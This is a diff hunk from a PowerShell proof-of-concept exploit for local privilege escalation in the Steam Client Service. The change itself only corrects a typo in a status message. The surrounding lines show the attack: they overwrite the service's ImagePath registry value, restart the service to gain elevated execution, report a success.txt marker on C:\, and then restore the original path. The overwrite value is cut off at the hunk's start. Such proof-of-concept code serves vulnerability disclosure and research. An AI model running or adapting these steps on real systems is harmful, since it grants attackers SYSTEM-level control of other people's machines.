@@ -13,7 +13,7 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Ser
 Write-Host "[*] binPath overwritten, restarting the service to trigger EoP. This will error out, just ignore it"
 Get-Service "Steam Client Service" | Restart-Service
 Write-Host "[*] Done, a file called success.txt has been created on the C:\ drive"
-Write-Host "[*] Attemtping to remove leftovers and restarting steam client"
+Write-Host "[*] Attempting to remove leftovers and restarting steam client"
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "`"C:\Program Files (x86)\Common Files\Steam\SteamService.exe`" /RunAsService"
 Get-Service "Steam Client Service" | Restart-Service
 Get-Service "Steam Client Service"
